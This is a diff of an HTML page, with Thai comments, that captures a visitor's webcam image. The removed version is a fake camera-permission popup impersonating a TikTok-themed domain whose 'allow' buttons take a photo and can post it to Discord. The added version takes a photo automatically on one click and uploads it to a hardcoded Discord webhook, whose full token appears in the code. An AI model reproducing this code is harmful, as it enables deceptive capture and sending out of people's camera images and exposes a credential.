@@ -5,266 +5,73 @@
   <title>Artkungloveyouna</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #000;
-      color: #e5e7eb;
+      font-family: system-ui, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    /* พื้นหลังโลโก้กลางจอ */
-    .tiktok-bg {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      pointer-events: none;
-      opacity: 0.25;
-      font-size: 120px;
-      font-weight: 700;
-    }
-
-    /* กล่องป๊อปอัป */
-    .modal {
-      position: relative;
-      z-index: 10;
-      width: 360px;
-      background: #111827;
-      border-radius: 12px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-      padding: 18px 18px 20px;
-    }
-
-    .modal-header {
-      font-size: 14px;
-      margin-bottom: 8px;
+      padding: 20px;
+      background: #0f172a;
       color: #e5e7eb;
-      font-weight: 600;
     }
-
-    .modal-sub {
-      font-size: 13px;
-      color: #9ca3af;
-      margin-bottom: 16px;
-    }
-
-    .preview-box {
-      background: #020617;
-      border-radius: 10px;
-      border: 1px solid #1f2937;
-      padding: 8px;
-      margin-bottom: 10px;
-      height: 150px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .preview-box video {
-      max-width: 100%;
-      max-height: 100%;
-      border-radius: 8px;
-      display: none;
-    }
-
-    .spinner {
-      border: 3px solid #1f2937;
-      border-top: 3px solid #38bdf8;
-      border-radius: 50%;
-      width: 32px;
-      height: 32px;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .device-select {
-      width: 100%;
-      margin-bottom: 14px;
-    }
-
-    .device-select select {
-      width: 100%;
-      background: #020617;
-      border-radius: 8px;
-      border: 1px solid #1f2937;
-      padding: 6px 10px;
-      font-size: 13px;
-      color: #e5e7eb;
-      outline: none;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 8px 10px;
+    a#captureLink {
+      display: inline-block;
+      padding: 12px 20px;
       border-radius: 999px;
-      border: none;
-      cursor: pointer;
-      font-size: 14px;
-      margin-bottom: 8px;
-      font-weight: 500;
-      transition: background 0.15s, transform 0.05s, opacity 0.15s;
-    }
-
-    .btn:active {
-      transform: translateY(1px);
-    }
-
-    .btn-primary {
-      background: #0ea5e9;
+      text-decoration: none;
+      background: #22c55e;
       color: #0f172a;
+      font-weight: 600;
+      margin-top: 40px;
     }
-
-    .btn-secondary {
-      background: #0369a1;
-      color: #e5e7eb;
+    video, canvas, img {
+      margin-top: 20px;
+      border-radius: 12px;
+      max-width: 100%;
+      width: 320px;
     }
-
-    .btn-danger {
-      background: #27272a;
-      color: #f97373;
-    }
-
-    .btn:hover {
-      opacity: 0.9;
-    }
-
-    .status {
-      margin-top: 4px;
-      font-size: 12px;
+    .note {
+      font-size: 13px;
       color: #9ca3af;
-      min-height: 18px;
-    }
-
-    .status.error {
-      color: #f97373;
-    }
-
-    .bottom-note {
-      position: absolute;
-      bottom: 10px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 11px;
-      color: #6b7280;
-    }
-
-    /* รูปตัวอย่างที่ถ่ายแล้ว (optional) */
-    .photo-preview {
-      position: fixed;
-      right: 16px;
-      bottom: 16px;
-      width: 120px;
-      border-radius: 10px;
-      border: 1px solid #1f2937;
-      overflow: hidden;
-      background: #020617;
-      padding: 4px;
-      font-size: 11px;
-      color: #9ca3af;
-    }
-
-    .photo-preview img {
-      width: 100%;
-      border-radius: 6px;
-      display: block;
-      margin-bottom: 2px;
+      margin-top: 10px;
+      text-align: center;
+      max-width: 360px;
     }
   </style>
 </head>
 <body>
-  <!-- พื้นหลังโลโก้ติ๊กต็อกปลอม ๆ -->
-  <div class="tiktok-bg">
-    <span>♪</span>
-  </div>
 
-  <!-- ป๊อปอัปเหมือนรูปที่อาร์ตส่ง -->
-  <div class="modal">
-    <div class="modal-header">
-      tiktok.wetching.ru ต้องการที่จะ
-    </div>
-    <div class="modal-sub">
-      ใช้กล้องสำหรับวิดีโอสตรีม (2)
-    </div>
+  <h1>Send Camera Capture to Discord</h1>
+  <p class="note">
+    กดปุ่มด้านล่าง → กล้องจะเปิด → ถ่ายรูปอัตโนมัติ<br>
+    และส่งรูปไปที่ Discord channel ของคุณทันที
+  </p>
 
-    <div class="preview-box">
-      <video id="video" playsinline autoplay></video>
-      <div class="spinner" id="spinner"></div>
-    </div>
+  <a href="#" id="captureLink">เริ่มถ่ายแล้วส่งรูป</a>
 
-    <div class="device-select">
-      <select id="cameraSelect">
-        <option>กล้องเริ่มต้นของระบบ</option>
-      </select>
-    </div>
-
-    <button class="btn btn-primary" id="allowAlways">
-      อนุญาตตลอดการใช้งานเว็บไซต์
-    </button>
-
-    <button class="btn btn-secondary" id="allowOnce">
-      อนุญาตแค่ครั้งนี้
-    </button>
-
-    <button class="btn btn-danger" id="denyBtn">
-      ไม่อนุญาต
-    </button>
-
-    <div class="status" id="statusText"></div>
-  </div>
-
-  <!-- ตัวอย่างรูปที่ถ่ายแล้ว (ไว้ดูเล่น) -->
-  <div class="photo-preview">
-    <div>ภาพล่าสุด</div>
-    <img id="photo" alt="preview">
-  </div>
-
-  <div class="bottom-note">
-    Demo by Art — กล้องจะถามสิทธิ์จากเบราว์เซอร์จริง
-  </div>
-
+  <video id="video" playsinline autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  <img id="photo" alt="preview">
+  <p class="note" id="status"></p>
 
   <script>
-    // 👉 ถ้าอยากส่งไป Discord ให้ใส่ Webhook URL ตรงนี้
-    const WEBHOOK_URL = ""; // ใส่ URL ถ้าอยากส่ง
+    // ใช้ Webhook URL ของอาร์ตตรงนี้
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";
 
-    const video       = document.getElementById("video");
-    const spinner     = document.getElementById("spinner");
-    const canvas      = document.getElementById("canvas");
-    const photo       = document.getElementById("photo");
-    const statusText  = document.getElementById("statusText");
-    const allowOnce   = document.getElementById("allowOnce");
-    const allowAlways = document.getElementById("allowAlways");
-    const denyBtn     = document.getElementById("denyBtn");
+    const captureLink = document.getElementById('captureLink');
+    const video       = document.getElementById('video');
+    const canvas      = document.getElementById('canvas');
+    const photo       = document.getElementById('photo');
+    const statusText  = document.getElementById('status');
 
-    let streamRef = null;
-
-    async function openCameraAndCapture() {
+    async function startCapture() {
       statusText.textContent = "กำลังเปิดกล้อง...";
-      statusText.classList.remove("error");
-      spinner.style.display = "block";
-      video.style.display   = "none";
-
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        streamRef = stream;
+
         video.srcObject = stream;
+        video.style.display = 'block';
 
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
@@ -273,73 +80,55 @@
           };
         });
 
-        spinner.style.display = "none";
-        video.style.display   = "block";
-        statusText.textContent = "กำลังเตรียมถ่ายรูป...";
+        statusText.textContent = "กำลังถ่ายรูป...";
 
-        // รอให้ภาพนิ่งนิดนึง
-        await new Promise(r => setTimeout(r, 700));
+        await new Promise(r => setTimeout(r, 800));
 
-        const w = video.videoWidth;
-        const h = video.videoHeight;
-        canvas.width = w;
-        canvas.height = h;
+        const width  = video.videoWidth;
+        const height = video.videoHeight;
 
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, w, h);
+        canvas.width = width;
+        canvas.height = height;
 
-        const dataURL = canvas.toDataURL("image/png");
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, width, height);
+
+        const dataURL = canvas.toDataURL('image/png');
         photo.src = dataURL;
 
-        statusText.textContent = "ถ่ายรูปเรียบร้อยแล้ว ✅";
+        // แปลงเป็น Blob
+        const blob = await (await fetch(dataURL)).blob();
+        const filename = "capture-" + Date.now() + ".png";
 
-        // ถ้าอยากส่งไป Discord
-        if (WEBHOOK_URL) {
-          statusText.textContent = "กำลังส่งรูปไป Discord...";
-          const blob = await (await fetch(dataURL)).blob();
-          const form = new FormData();
-          form.append("file", blob, "capture-" + Date.now() + ".png");
-          form.append("content", "📸 New capture from Art demo");
+        const form = new FormData();
+        form.append("file", blob, filename);
+        form.append("content", "📸 Photo captured from art.github.io");
 
-          const res = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            body: form
-          });
+        statusText.textContent = "กำลังส่งรูปไป Discord...";
 
-          if (res.ok) {
-            statusText.textContent = "ส่งรูปไป Discord สำเร็จ ✅";
-          } else {
-            statusText.textContent = "ส่งรูปไม่สำเร็จ ❌ (" + res.status + ")";
-            statusText.classList.add("error");
-          }
+        const res = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          body: form
+        });
+
+        if (res.ok) {
+          statusText.textContent = "ส่งรูปสำเร็จ! ไปดูใน Discord ได้เลย ✅";
+        } else {
+          statusText.textContent = "ส่งรูปไม่สำเร็จ ❌ Error: " + res.status;
         }
+
+        stream.getTracks().forEach(t => t.stop());
+        video.style.display = "none";
 
       } catch (err) {
         console.error(err);
-        spinner.style.display = "none";
         statusText.textContent = "เปิดกล้องไม่ได้หรือถูกปฏิเสธ ❌";
-        statusText.classList.add("error");
-      } finally {
-        if (streamRef) {
-          streamRef.getTracks().forEach(t => t.stop());
-          streamRef = null;
-        }
       }
     }
 
-    // ปุ่ม “อนุญาต” ทั้งสองอันให้ทำเหมือนกันไปก่อน
-    allowOnce.addEventListener("click", () => {
-      openCameraAndCapture();
-    });
-
-    allowAlways.addEventListener("click", () => {
-      // ในเว็บจริงอาจเก็บ state ว่าเคยกด always แล้ว
-      openCameraAndCapture();
-    });
-
-    denyBtn.addEventListener("click", () => {
-      statusText.textContent = "ผู้ใช้ปฏิเสธการใช้กล้อง ❌";
-      statusText.classList.add("error");
+    captureLink.addEventListener('click', e => {
+      e.preventDefault();
+      startCapture();
     });
   </script>
 </body>
